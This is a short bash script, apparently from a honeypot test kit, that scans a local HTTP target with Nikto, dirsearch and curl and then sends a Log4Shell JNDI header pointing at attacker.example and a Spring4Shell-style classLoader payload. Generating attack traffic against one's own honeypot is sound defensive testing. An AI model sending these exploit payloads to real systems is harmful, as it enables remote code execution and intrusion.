#!/usr/bin/env bash
# B10 - Scan HTTP (Nikto + dirsearch + curl payloads CVE) contre le honeypot.
# Usage: bash attacks/run_http_scan.sh [base_url]
set -uo pipefail
BASE="${1:-http://127.0.0.1:8080}"
HERE="$(cd "$(dirname "$0")" && pwd)"

echo "[*] Scan HTTP -> $BASE"

if command -v nikto >/dev/null 2>&1; then
  nikto -h "$BASE" -maxtime 60s || true
else
  echo "[!] nikto absent"
fi

if command -v dirsearch >/dev/null 2>&1; then
  dirsearch -u "$BASE" -w "$HERE/../datasets/paths.txt" -q || true
fi

echo "[*] Requetes ciblees (chemins sensibles + payloads CVE)"
while read -r path; do
  [ -z "$path" ] && continue
  curl -s -A "python-requests/2.31" -o /dev/null -w "  %{http_code} $path\n" "$BASE$path" || true
done < "$HERE/../datasets/paths.txt"

# Log4Shell (CVE-2021-44228) dans un header + Spring4Shell-like payload
curl -s -o /dev/null -A 'Mozilla/5.0 zgrab/0.x' \
  -H 'X-Api-Version: ${jndi:ldap://attacker.example/a}' "$BASE/api/v1/users" || true
curl -s -o /dev/null -X POST -A 'curl/8.2' \
  --data 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=evil' \
  "$BASE/admin" || true

echo "[+] Scan HTTP termine."
